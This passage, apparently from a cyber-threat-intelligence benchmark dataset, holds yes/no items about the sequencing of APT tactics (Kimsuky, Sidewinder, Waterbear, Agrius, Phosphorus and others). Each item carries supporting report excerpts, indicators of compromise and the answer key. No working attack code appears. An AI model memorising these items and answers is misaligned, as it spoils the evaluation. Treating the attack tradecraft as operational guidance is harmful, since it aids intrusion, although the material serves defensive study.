Command and Control: Communication between the malware and the attackers occurs through a Bulgarian web-based free email server, mail.bg. The malware uses hardcoded credentials to send and receive instructions via email.
Exfiltration: The malware exfiltrates collected data, including system information, user-related info, and keystrokes, by encrypting it with RC4 and sending it to the attackers' email accounts.
Others: The campaign, attributed to the threat actor 'Kimsuky,' is suspected to originate from North Korea, given the targeted entities and the attackers' IP addresses located in China's Jilin and Liaoning provinces, which maintain lines into North Korea. The malware uses various files and MD5 hashes, and it creates services with specific names to operate. The attackers use modified TeamViewer components for remote control, and the malware is detected as Trojan.Win32.Kimsuky, except for the TeamViewer components, which are detected as Trojan.Win32.Patched.ps.",Yes,Kimsuky
94,110,110-Defense Evasion-T1574-Hijack Execution Flow,"After exploiting CVE-2017-11882 using an RTF document to download an HTA file, is Sidewinder likely to employ the HTA file to check for antivirus software using WMI and communicate with the C2 server before using DLL sideloading to execute Srvstr.exe for defense evasion?","Defense Evasion: Sidewinder's HTA file avoided using PowerShell, which is commonly monitored, and instead used VBS. The backdoor also employed a technique called DLL sideloading, using cmpbk32.dll to execute Srvstr.exe.","Initial Access: APT Sidewinder exploited CVE-2017-11882 using an RTF document to download an HTA file from the domain webserv-redir.net. The HTA file, avoiding PowerShell to remain undetected, checked for installed antivirus software using WMI and communicated with the C2 server.
Execution: The HTA file contained within the RTF document executed a script that stopped if certain antivirus software was detected. If not detected, it proceeded to run a backdoor named FinalBot.exe, which was extracted from a zip file and renamed to Srvstr.exe in the directory. The backdoor was developed in VB and utilized a modified msvbvm60.dll, renamed to 8EBECD7C.dll.
Persistence: The backdoor established persistence by creating a Run key in the registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WinSrv.
Discovery: The HTA file used WMI to discover installed antivirus products on the victim's system.
Command and Control: The HTA file communicated with the C2 server to send information about the installed antivirus software. The domain used for C2 communication was webserv-redir.net.
Others: Indicators of compromise (IOCs) associated with the Sidewinder campaign include various hashes for files such as Test.Zip, FinalBot.exe, hj1.txt, hj.txt, and the domain webserv-redir.net with its associated IP address 185.106.120.43. Additional related domains include heartissuehigh.win, mail.webserv-redir.net, and www.webserv-redir.net. An RTF document was also identified as an IOC with the URL hxxp://www.webserv-redir.net/images/67381F0B/-1/5272/3cdc4fcb/main.RTF.",Yes,APT Sidewinder changes theirs TTPs to install their backdoor
98,110,110-Discovery-T1518-Software Discovery,"After executing a backdoor named FinalBot.exe which was extracted and renamed to Srvstr.exe, is Sidewinder likely to use the HTA file to discover installed antivirus products on the victim's system before communicating this information to the C2 server?",Discovery: The HTA file used WMI to discover installed antivirus products on the victim's system.,"Initial Access: APT Sidewinder exploited CVE-2017-11882 using an RTF document to download an HTA file from the domain webserv-redir.net. The HTA file, avoiding PowerShell to remain undetected, checked for installed antivirus software using WMI and communicated with the C2 server.
Execution: The HTA file contained within the RTF document executed a script that stopped if certain antivirus software was detected. If not detected, it proceeded to run a backdoor named FinalBot.exe, which was extracted from a zip file and renamed to Srvstr.exe in the directory. The backdoor was developed in VB and utilized a modified msvbvm60.dll, renamed to 8EBECD7C.dll.
Persistence: The backdoor established persistence by creating a Run key in the registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WinSrv.
Defense Evasion: Sidewinder's HTA file avoided using PowerShell, which is commonly monitored, and instead used VBS. The backdoor also employed a technique called DLL sideloading, using cmpbk32.dll to execute Srvstr.exe.
Command and Control: The HTA file communicated with the C2 server to send information about the installed antivirus software. The domain used for C2 communication was webserv-redir.net.
Others: Indicators of compromise (IOCs) associated with the Sidewinder campaign include various hashes for files such as Test.Zip, FinalBot.exe, hj1.txt, hj.txt, and the domain webserv-redir.net with its associated IP address 185.106.120.43. Additional related domains include heartissuehigh.win, mail.webserv-redir.net, and www.webserv-redir.net. An RTF document was also identified as an IOC with the URL hxxp://www.webserv-redir.net/images/67381F0B/-1/5272/3cdc4fcb/main.RTF.",Yes,APT Sidewinder changes theirs TTPs to install their backdoor
102,112,112-Defense Evasion-T1055-Process Injection,"After decrypting its RC4-encrypted payload and injecting it into an existing Windows Service for execution, is the Waterbear malware likely to use API hooking techniques to evade detection by modifying memory-resident functions such as 'ZwOpenProcess' and 'GetExtendedTcpTable'?","Defense Evasion: In a recent campaign, Waterbear was observed using API hooking techniques to evade detection by a specific security product. The malware injects code into the security product to hide its network behaviors. The payload uses API hooking to modify the functions 'ZwOpenProcess' and 'GetExtendedTcpTable' in memory, thus avoiding detection while the original system DLL files remain unchanged. The API hooking is designed to hide specific processes and TCP endpoint records associated with Waterbear's activities.","Execution: The Waterbear campaign, associated with the BlackTech cyberespionage group, uses a modular malware approach. It employs a DLL loader to decrypt and execute an RC4-encrypted payload, typically a first-stage backdoor. This backdoor can receive and load additional executables from external attackers. The infection begins with a malicious DLL loader, which can be triggered by modifying a legitimate server application to import the malicious DLL or through phantom DLL hijacking and DLL side-loading. The loader searches for a hardcoded path to decrypt the payload, which is then injected into an existing Windows Service, such as LanmanServer, run by svchost.exe.
Command and Control: Waterbear's first-stage backdoor configuration contains information required for execution and communication with external entities. It includes an encryption/decryption key, version, mutex, and XOR-encrypted C&C server address. If the backdoor is intended to listen on a specific port, this section will be filled with 0x00. The backdoor can connect to a C&C server or open a port to wait for external connections and load incoming executables.
Others: The Waterbear campaign targets technology companies and government agencies in East Asia, specifically Taiwan, and sometimes Japan and Hong Kong. The attackers demonstrate knowledge of the victims' environments and security products, indicating a high level of familiarity with their targets. The API hooking shellcode is generic and could potentially be used to target other security products in the future, making Waterbear harder to detect.",Yes,"Waterbear is Back, Uses API Hooking to Evade Security Product Detection"
104,112,112-Command and Control-T1573-Encrypted Channel,"After using API hooking techniques to evade detection by modifying functions 'ZwOpenProcess' and 'GetExtendedTcpTable' in memory, is it likely that Waterbear's backdoor configuration will include an encryption/decryption key and XOR-encrypted C&C server address for its communication with external entities?","Command and Control: Waterbear's first-stage backdoor configuration contains information required for execution and communication with external entities. It includes an encryption/decryption key, version, mutex, and XOR-encrypted C&C server address. If the backdoor is intended to listen on a specific port, this section will be filled with 0x00. The backdoor can connect to a C&C server or open a port to wait for external connections and load incoming executables.","Execution: The Waterbear campaign, associated with the BlackTech cyberespionage group, uses a modular malware approach. It employs a DLL loader to decrypt and execute an RC4-encrypted payload, typically a first-stage backdoor. This backdoor can receive and load additional executables from external attackers. The infection begins with a malicious DLL loader, which can be triggered by modifying a legitimate server application to import the malicious DLL or through phantom DLL hijacking and DLL side-loading. The loader searches for a hardcoded path to decrypt the payload, which is then injected into an existing Windows Service, such as LanmanServer, run by svchost.exe.
Defense Evasion: In a recent campaign, Waterbear was observed using API hooking techniques to evade detection by a specific security product. The malware injects code into the security product to hide its network behaviors. The payload uses API hooking to modify the functions 'ZwOpenProcess' and 'GetExtendedTcpTable' in memory, thus avoiding detection while the original system DLL files remain unchanged. The API hooking is designed to hide specific processes and TCP endpoint records associated with Waterbear's activities.
Others: The Waterbear campaign targets technology companies and government agencies in East Asia, specifically Taiwan, and sometimes Japan and Hong Kong. The attackers demonstrate knowledge of the victims' environments and security products, indicating a high level of familiarity with their targets. The API hooking shellcode is generic and could potentially be used to target other security products in the future, making Waterbear harder to detect.",Yes,"Waterbear is Back, Uses API Hooking to Evade Security Product Detection"
106,112,112-Command and Control-T1105-Ingress Tool Transfer,"After using API hooking techniques to modify 'ZwOpenProcess' and 'GetExtendedTcpTable' for defense evasion by masking processes and TCP endpoints, is it likely that the Waterbear backdoor will load incoming executables after establishing communication with a C&C server using an XOR-encrypted address?","Command and Control: Waterbear's first-stage backdoor configuration contains information required for execution and communication with external entities. It includes an encryption/decryption key, version, mutex, and XOR-encrypted C&C server address. If the backdoor is intended to listen on a specific port, this section will be filled with 0x00. The backdoor can connect to a C&C server or open a port to wait for external connections and load incoming executables.","Execution: The Waterbear campaign, associated with the BlackTech cyberespionage group, uses a modular malware approach. It employs a DLL loader to decrypt and execute an RC4-encrypted payload, typically a first-stage backdoor. This backdoor can receive and load additional executables from external attackers. The infection begins with a malicious DLL loader, which can be triggered by modifying a legitimate server application to import the malicious DLL or through phantom DLL hijacking and DLL side-loading. The loader searches for a hardcoded path to decrypt the payload, which is then injected into an existing Windows Service, such as LanmanServer, run by svchost.exe.
Defense Evasion: In a recent campaign, Waterbear was observed using API hooking techniques to evade detection by a specific security product. The malware injects code into the security product to hide its network behaviors. The payload uses API hooking to modify the functions 'ZwOpenProcess' and 'GetExtendedTcpTable' in memory, thus avoiding detection while the original system DLL files remain unchanged. The API hooking is designed to hide specific processes and TCP endpoint records associated with Waterbear's activities.
Others: The Waterbear campaign targets technology companies and government agencies in East Asia, specifically Taiwan, and sometimes Japan and Hong Kong. The attackers demonstrate knowledge of the victims' environments and security products, indicating a high level of familiarity with their targets. The API hooking shellcode is generic and could potentially be used to target other security products in the future, making Waterbear harder to detect.",Yes,"Waterbear is Back, Uses API Hooking to Evade Security Product Detection"
108,113,113-Persistence-T1136-Create Account,"After employing phishing with document attachments for initial access, is ALLANITE likely to conduct credential harvesting for accessing credentials after creating user accounts for persistence?","Persistence: The report details that Dragonfly 2.0 utilized KARAGANY malware for persistence, while DYMALLOY and ALLANITE employed various malware and backdoors. ALLANITE also created user accounts and engaged in credential harvesting for maintaining persistence.","Initial Access: The CTI report indicates that the Dragonfly 2.0 group was active from 2013 to 2014, targeting Europe and North America. Their infection vector included phishing with PDF attachments, watering holes, and trojanized software. DYMALLOY, active since late 2015, has targeted Turkey, Europe, and North America using phishing with document attachments. ALLANITE, active from mid-2017, has targeted the USA, UK, and Germany with phishing using document attachments and watering holes.
Credential Access: ALLANITE's persistence techniques included creating user accounts and credential harvesting, indicating their methods for accessing credentials.
Collection: Dragonfly 2.0's impact on Industrial Control Systems (ICS) involved OPC-focused malware, while DYMALLOY and ALLANITE conducted surveys and took screenshots via malware and system tools, respectively, as part of their collection tactics.
Impact: The report describes the impact of Dragonfly 2.0's activities, which involved OPC-focused malware. DYMALLOY and ALLANITE's activities included surveys and screenshots, which could be indicative of their impact on the targeted systems.
Others: The CTI report by Sergio Caltagirone and Joe Slowik from Dragos.com introduces the concept of Activity Groups as a framework for analyzing and mitigating cyber threats. Activity Groups are defined by similarities in features or processes and are weighted by confidence. They are dynamic and change over time to incorporate new knowledge about adversaries. The report emphasizes that Activity Groups are not static and must be updated to maintain accuracy. The creation of an Activity Group involves selecting features, classifying events, and analyzing the groups to address specific analytic problems. The report also discusses the challenges of naming and correlating activities across different organizations due to the complexity of classification and the need for a shared grouping function and feature vector.",Yes,dragosactivitygroupswebinarfinal-190122171111
116,114,114-Execution-T1569-System Services,"After exploiting public-facing applications to upload webshells and using RDP for lateral movement, is it likely that the backdoor 'IPsec Helper' would be utilized to exfiltrate data to C2 servers as part of its execution functionality?","Execution: Agrius deployed custom malware, including a .NET backdoor named 'IPsec Helper', which was used to exfiltrate data or deploy additional malware. This backdoor was registered as a service for persistence and could execute commands, upload files, and update its configuration based on commands from C2 servers.","Initial Access: Agrius' primary method for gaining initial access involved exploiting public-facing applications, likely using publicly available exploits. The group attempted to exploit FortiOS CVE-2018-13379 against Israeli targets and also tried various 1-day vulnerabilities and SQL injection. Successful exploitation led to the uploading of webshells for lateral movement using RDP.
Persistence: Agrius achieved persistence by deploying webshells and registering its custom backdoor 'IPsec Helper' as a service on compromised systems.
Defense Evasion: Agrius used webshells with variations of ASPXSpy, some of which were obfuscated with a custom base64 encoding function unique to the group. The backdoor 'IPsec Helper' contained functionality to update its engine and delete traces of itself to evade defenses.
Lateral Movement: Agrius used webshells to tunnel RDP traffic and leverage compromised accounts for lateral movement within the target network. The group utilized a variety of publicly available offensive security tools for credential harvesting and lateral movement.
Command and Control: The 'IPsec Helper' backdoor communicated with C2 servers over HTTP, based on a configuration file containing encrypted server addresses. The malware awaited commands from these relays, which included updating relays, sending recon information, downloading files, and self-deletion.
Impact: Agrius deployed wipers, including 'Apostle' and DEADWOOD, to destroy data on targeted systems. Initially, 'Apostle' was a wiper that failed to execute properly due to a logic flaw but was later turned into functioning ransomware. DEADWOOD was used to overwrite files with random data and could be executed in service or Windows application mode, with various functionalities to prevent user access and ensure proper execution.",Yes,evol-agrius
117,114,114-Persistence-T1543-Create or Modify System Process,"After exploiting public-facing applications for initial access and uploading webshells for lateral movement using RDP, is it likely that Agrius will deploy custom malware, such as the 'IPsec Helper' backdoor, for execution before achieving persistence by registering the 'IPsec Helper' as a service and deploying webshells on compromised systems?",Persistence: Agrius achieved persistence by deploying webshells and registering its custom backdoor 'IPsec Helper' as a service on compromised systems.,"Initial Access: Agrius' primary method for gaining initial access involved exploiting public-facing applications, likely using publicly available exploits. The group attempted to exploit FortiOS CVE-2018-13379 against Israeli targets and also tried various 1-day vulnerabilities and SQL injection. Successful exploitation led to the uploading of webshells for lateral movement using RDP.
Execution: Agrius deployed custom malware, including a .NET backdoor named 'IPsec Helper', which was used to exfiltrate data or deploy additional malware. This backdoor was registered as a service for persistence and could execute commands, upload files, and update its configuration based on commands from C2 servers.
Defense Evasion: Agrius used webshells with variations of ASPXSpy, some of which were obfuscated with a custom base64 encoding function unique to the group. The backdoor 'IPsec Helper' contained functionality to update its engine and delete traces of itself to evade defenses.
Lateral Movement: Agrius used webshells to tunnel RDP traffic and leverage compromised accounts for lateral movement within the target network. The group utilized a variety of publicly available offensive security tools for credential harvesting and lateral movement.
Command and Control: The 'IPsec Helper' backdoor communicated with C2 servers over HTTP, based on a configuration file containing encrypted server addresses. The malware awaited commands from these relays, which included updating relays, sending recon information, downloading files, and self-deletion.
Impact: Agrius deployed wipers, including 'Apostle' and DEADWOOD, to destroy data on targeted systems. Initially, 'Apostle' was a wiper that failed to execute properly due to a logic flaw but was later turned into functioning ransomware. DEADWOOD was used to overwrite files with random data and could be executed in service or Windows application mode, with various functionalities to prevent user access and ensure proper execution.",Yes,evol-agrius
123,114,114-Impact-T1485-Data Destruction,"After the 'IPsec Helper' awaits commands from C2 servers to send recon information or download files, is Agrius likely to deploy the 'Apostle' wiper that initially failed execution and the 'DEADWOOD' malware to overwrite files as part of its data destruction activities?","Impact: Agrius deployed wipers, including 'Apostle' and DEADWOOD, to destroy data on targeted systems. Initially, 'Apostle' was a wiper that failed to execute properly due to a logic flaw but was later turned into functioning ransomware. DEADWOOD was used to overwrite files with random data and could be executed in service or Windows application mode, with various functionalities to prevent user access and ensure proper execution.","Initial Access: Agrius' primary method for gaining initial access involved exploiting public-facing applications, likely using publicly available exploits. The group attempted to exploit FortiOS CVE-2018-13379 against Israeli targets and also tried various 1-day vulnerabilities and SQL injection. Successful exploitation led to the uploading of webshells for lateral movement using RDP.
Execution: Agrius deployed custom malware, including a .NET backdoor named 'IPsec Helper', which was used to exfiltrate data or deploy additional malware. This backdoor was registered as a service for persistence and could execute commands, upload files, and update its configuration based on commands from C2 servers.
Persistence: Agrius achieved persistence by deploying webshells and registering its custom backdoor 'IPsec Helper' as a service on compromised systems.
Defense Evasion: Agrius used webshells with variations of ASPXSpy, some of which were obfuscated with a custom base64 encoding function unique to the group. The backdoor 'IPsec Helper' contained functionality to update its engine and delete traces of itself to evade defenses.
Lateral Movement: Agrius used webshells to tunnel RDP traffic and leverage compromised accounts for lateral movement within the target network. The group utilized a variety of publicly available offensive security tools for credential harvesting and lateral movement.
Command and Control: The 'IPsec Helper' backdoor communicated with C2 servers over HTTP, based on a configuration file containing encrypted server addresses. The malware awaited commands from these relays, which included updating relays, sending recon information, downloading files, and self-deletion.",Yes,evol-agrius
124,114,114-Impact-T1486-Data Encrypted for Impact,"After using the 'IPsec Helper' backdoor to communicate with C2 servers over HTTP and perform actions such as updating relays or downloading files, is it likely that Agrius eventually deployed wipers like 'Apostle', later turned into functioning ransomware, to destroy data on targeted systems?","Impact: Agrius deployed wipers, including 'Apostle' and DEADWOOD, to destroy data on targeted systems. Initially, 'Apostle' was a wiper that failed to execute properly due to a logic flaw but was later turned into functioning ransomware. DEADWOOD was used to overwrite files with random data and could be executed in service or Windows application mode, with various functionalities to prevent user access and ensure proper execution.","Initial Access: Agrius' primary method for gaining initial access involved exploiting public-facing applications, likely using publicly available exploits. The group attempted to exploit FortiOS CVE-2018-13379 against Israeli targets and also tried various 1-day vulnerabilities and SQL injection. Successful exploitation led to the uploading of webshells for lateral movement using RDP.
Execution: Agrius deployed custom malware, including a .NET backdoor named 'IPsec Helper', which was used to exfiltrate data or deploy additional malware. This backdoor was registered as a service for persistence and could execute commands, upload files, and update its configuration based on commands from C2 servers.
Persistence: Agrius achieved persistence by deploying webshells and registering its custom backdoor 'IPsec Helper' as a service on compromised systems.
Defense Evasion: Agrius used webshells with variations of ASPXSpy, some of which were obfuscated with a custom base64 encoding function unique to the group. The backdoor 'IPsec Helper' contained functionality to update its engine and delete traces of itself to evade defenses.
Lateral Movement: Agrius used webshells to tunnel RDP traffic and leverage compromised accounts for lateral movement within the target network. The group utilized a variety of publicly available offensive security tools for credential harvesting and lateral movement.
Command and Control: The 'IPsec Helper' backdoor communicated with C2 servers over HTTP, based on a configuration file containing encrypted server addresses. The malware awaited commands from these relays, which included updating relays, sending recon information, downloading files, and self-deletion.",Yes,evol-agrius
129,115,115-Persistence-T1547-Boot or Logon Autostart Execution,"After utilizing a malicious PDF document exploiting CVE-2011-4369 to download and install the 'bunny dropper,' is it likely that the EvilBunny campaign will ensure persistence by creating registry keys for the execution of 'netmgr.exe' at system boot before the dropper performs sandbox checks and antivirus enumeration to evade detection?","Persistence: The 'bunny dropper' ensured persistence by creating a registry key under [HKLM|HKCU]\...\CurrentVersion\Run pointing to the dropped 'netmgr.exe' binary, ensuring its execution at system boot. Additionally, it created a registry key named 'isakmpAutoNegociate' under [HKLM|HKCU]\Software\Microsoft\IPSec for dropper cleanup, which was later used by 'netmgr.exe' to locate and delete the dropper binary.","Initial Access: The EvilBunny campaign utilized a malicious PDF document to exploit CVE-2011-4369 on December 20, 2011. The exploit downloaded and installed the 'bunny dropper' which subsequently installed 'suspect #4' malware on the infected system. Both the dropper and payload were compiled on October 25, 2011, prior to the public release of CVE-2011-4369 on December 16, indicating the attackers either quickly adopted the vulnerability or used a zero-day exploit.
Defense Evasion: The 'bunny dropper' performed a sandbox check and enumerated antivirus products to evade detection. It aborted execution if certain conditions were met, such as the module file name being less than 5 characters or containing specific strings, or if less than 15 processes were running. It also accessed the system's WMI to query installed antivirus software. Suspect #4, the payload, aimed to inject itself into an 'svchost.exe' process for stealthiness and relied on the auto-start registry key created by the dropper for persistence.
Command and Control: The 'netmgr.exe' malware decrypted a configuration file revealing three C&C server URLs and various settings, including encryption keys and timeout settings. The URLs served as contacts for sending commands or Lua scripts to the infected host. The malware also contained a URL 'http://1.9.32.11/bunny/test.php?rec=nvista', but its purpose was unclear as the malware never contacted this IP address.",Yes,EvilBunny_Suspect4_v1.0
138,116,116-Command and Control-T1071-Application Layer Protocol,"After utilizing features such as running in memory and multi-beacon communication for defense evasion, is it likely that APT-TOCS will use PowerShell to download encrypted data scripts and communicate with compromised systems via HTTP GET requests during the command and control tactic stage?",Command and Control: APT-TOCS used encrypted data scripts downloaded by PowerShell for command and control. The attack communicated with compromised systems using HTTP GET requests to specific URLs and transmitted heartbeat packages using Cookie fields with 60 seconds intervals.,"Initial Access: The APT-TOCS attack utilized ""powershell.exe"" to execute Shellcode scripts for remote control of targeted systems. Attackers may have used security vulnerabilities to execute scripts directly on the host. A binary file named Sample A, identified as Trojan/Win32.MSShell with MD5 44BCF2DD262F12222ADEAB6F59B2975B, was used in similar attacks to lead the attack by executing embedded malware using WinExec to call ""powershell.exe"".
Execution: The APT-TOCS attack's core step involved downloading Shellcode script functionalities, which were then executed in memory without writing to the hard disk. The attack pattern included communication via Beacon mode, sending network heartbeat packages every 60 seconds, and transmitting data information via the Cookie field.
Defense Evasion: APT-TOCS exhibited features designed to evade detection by security software and firewall interception. The attack pattern included running in memory, no hard disk writing operations, and the use of multi-beacon communication, which could work simultaneously and evade sandbox detection.
Lateral Movement: APT-TOCS depended on network projection and could laterally move within the internal network as required to conduct an attack.
Others: APT-TOCS is closely related to the Cobalt Strike automatic attack testing platform. The attack can penetrate firewalls and is undetectable, capable of attacking various platforms, and formidable against Trusted Computing, Cloud Detection, and Sandbox Detection. The threat has been active for 5 years without powerful detection methods to defeat it. The attack is considered an APT due to its targeted nature, anti-detection functions, and ability to conceal itself. The use of a commercial attack platform reduces the cost and complexity of launching such attacks, making it difficult to trace the attackers.",Yes,ANALYSIS-ON-APT-TO-BE-ATTACK-THAT-FOCUSING-ON-CHINAS-GOVERNMENT-AGENCY-
141,117,117-Defense Evasion-T1027-Obfuscated Files or Information,"After exploiting the Ghostscript vulnerability through malicious Hangul Word Processor (HWP) files for initial access, is it likely that attackers will shift their attack methods by using simplified PostScript syntax in malicious EPS files for defense evasion before targeting specific professions or groups with impersonated documents for collection?","Defense Evasion: The report outlines changes in the attack methods, specifically in the PostScript code used in malicious EPS files within HWP documents. Attackers have shifted from previous methods like XOR encoding and obfuscation to a new approach using PostScript syntax. This change simplifies the code, making it harder to distinguish from normal EPS files and potentially avoiding detection.","Initial Access: The CTI report by ASEC (AhnLab Security Emergency-response Center) details the exploitation of a Ghostscript vulnerability (CVE-2017-8291) through malicious Hangul Word Processor (HWP) files. These files were first discovered in mid-2017 and continue to be a threat, targeting public sectors and cryptocurrency-related organizations. The attackers impersonate government institutions or organizations to distribute the malware, which has seen an increase in activity due to the COVID-19 situation, particularly in April 2020.
Collection: The report includes a collection of malicious HWP file samples discovered from January to May 2020, with file details indicating targeted attacks on specific professions or groups. The files often impersonated government inquiries or job-related documents.
Others: AhnLab's anti-malware product, V3, detects and blocks HWP malware using aliases such as HWP/Exploit, Exploit/HWP.Generic, Exploit/EPS.Generic, and Malware/MDP.Behavior.M2411. The report concludes with the possibility of further changes in malicious EPS file forms and emphasizes the importance of continuous analysis and assessment.",Yes,ASEC_REPORT_vol.99_ENG
144,118,118-Initial Access-T1190-Exploit Public-Facing Application,"After the PowerLess Backdoor gains persistence using Registry RunKeys or Startup Folder for autostart execution, is it likely that the Phosphorus group exploited Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks before deploying the PowerLess Backdoor?","Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.","Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Defense Evasion: The Phosphorus group's PowerLess Backdoor evades detection by running PowerShell within a .NET application, not spawning 'powershell.exe'. The group also impairs defenses by disabling or modifying system firewalls and modifies the registry to aid in defense evasion.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.
Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.
Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.
Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",Yes,PowerLess Trojan_ Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage
150,118,118-Defense Evasion-T1112-Modify Registry,"After compromising the Microsoft Exchange Server through ProxyShell vulnerabilities for initial access, is Phosphorus likely to execute PowerShell code within a .NET application to avoid detection by security products before modifying the registry to aid in defense evasion?","Defense Evasion: The Phosphorus group's PowerLess Backdoor evades detection by running PowerShell within a .NET application, not spawning 'powershell.exe'. The group also impairs defenses by disabling or modifying system firewalls and modifies the registry to aid in defense evasion.","Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.
Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.
Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.
Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.
Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",Yes,PowerLess Trojan_ Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage
151,118,118-Command and Control-T1102-Web Service,"After capturing user credentials using a keylogger module and performing OS credential dumping with known LOLBIN techniques, is it likely that the PowerLess Backdoor will communicate with a command and control (C2) server using encrypted channels and proxy techniques?",Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.,"Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.
Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Defense Evasion: The Phosphorus group's PowerLess Backdoor evades detection by running PowerShell within a .NET application, not spawning 'powershell.exe'. The group also impairs defenses by disabling or modifying system firewalls and modifies the registry to aid in defense evasion.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.
Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.
Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",Yes,PowerLess Trojan_ Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage
